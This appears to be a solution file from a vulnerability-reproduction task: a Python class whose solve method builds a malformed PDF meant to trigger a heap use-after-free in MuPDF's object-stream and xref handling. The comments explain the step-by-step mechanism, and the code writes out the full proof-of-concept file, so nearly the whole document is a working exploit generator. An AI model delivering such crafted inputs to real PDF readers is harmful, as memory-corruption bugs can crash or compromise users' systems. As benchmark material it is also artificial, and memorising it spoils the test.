import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a PDF PoC that triggers Heap Use After Free in MuPDF
        # Strategy: 
        # 1. Create a PDF with an Object Stream (ObjStm).
        # 2. Define an object (Obj 3) as compressed within that ObjStm.
        # 3. Inside the ObjStm content, include a definition for a very large object ID (100000).
        # 4. When Obj 3 is accessed, the ObjStm is loaded.
        # 5. pdf_load_obj_stm parses the stream content. It encounters 100000.
        # 6. It calls pdf_get_xref_entry(100000), which triggers a resize of the xref table.
        # 7. The resize frees the old xref table array.
        # 8. The caller (pdf_cache_object) holds a pointer to the old xref entry for Obj 3.
        # 9. After pdf_load_obj_stm returns, pdf_cache_object accesses the stale pointer -> UAF.

        header = b"%PDF-1.7\n%\x80\x81\x82\x83\n"
        
        objects = []
        current_pos = len(header)
        offsets = {}

        def add_obj(oid, content):
            nonlocal current_pos
            offsets[oid] = current_pos
            # Use binary format for constructing the object wrapper
            obj_start = b"%d 0 obj\n" % oid
            obj_end = b"\nendobj\n"
            full_obj = obj_start + content + obj_end
            objects.append(full_obj)
            current_pos += len(full_obj)
            
        # 1. Catalog
        add_obj(1, b"<< /Type /Catalog /Pages 4 0 R >>")
        
        # 4. Pages
        add_obj(4, b"<< /Type /Pages /Count 1 /Kids [ 5 0 R ] >>")
        
        # 5. Page -> References Obj 3 via Contents
        add_obj(5, b"<< /Type /Page /Parent 4 0 R /MediaBox [0 0 600 600] /Contents 3 0 R >>")
        
        # 2. ObjStm
        # Content: "3 0 100000 0" 
        # Obj 3 is at offset 0. Obj 100000 is at offset 0.
        # Both share the content "()".
        # 100000 triggers the resize of xref table because it > Size (7).
        stm_header = b"3 0 100000 0"
        stm_body = b"()"
        stm_payload = stm_header + stm_body
        
        # First is offset to first object data (after header)
        stm_dict = b"<< /Type /ObjStm /N 2 /First %d /Length %d >>\nstream\n%s\nendstream" % (
            len(stm_header), len(stm_payload), stm_payload
        )
        add_obj(2, stm_dict)
        
        # 6. XRef Stream
        # We need to know the offset of the XRef stream object itself (Obj 6)
        offsets[6] = current_pos
        
        # Build XRef entries
        # W [1 2 1] -> Type (1 byte), Field2 (2 bytes), Field3 (1 byte)
        rows = []
        
        # 0: Free entry
        rows.append(struct.pack('>BHB', 0, 0, 0))
        
        # 1: Catalog (Type 1, offset)
        rows.append(struct.pack('>BHB', 1, offsets[1], 0))
        
        # 2: ObjStm (Type 1, offset)
        rows.append(struct.pack('>BHB', 1, offsets[2], 0))
        
        # 3: Compressed Object (Type 2)
        # Field 2 = Container Obj ID (2)
        # Field 3 = Index in stream (0)
        rows.append(struct.pack('>BHB', 2, 2, 0))
        
        # 4: Pages (Type 1, offset)
        rows.append(struct.pack('>BHB', 1, offsets[4], 0))
        
        # 5: Page (Type 1, offset)
        rows.append(struct.pack('>BHB', 1, offsets[5], 0))
        
        # 6: XRef Stream (Type 1, offset)
        rows.append(struct.pack('>BHB', 1, offsets[6], 0))
        
        xref_data = b"".join(rows)
        xref_dict = b"<< /Type /XRef /Size 7 /W [1 2 1] /Root 1 0 R /Length %d >>\nstream\n%s\nendstream" % (
            len(xref_data), xref_data
        )
        add_obj(6, xref_dict)
        
        trailer = b"startxref\n%d\n%%EOF\n" % offsets[6]
        
        return header + b"".join(objects) + trailer
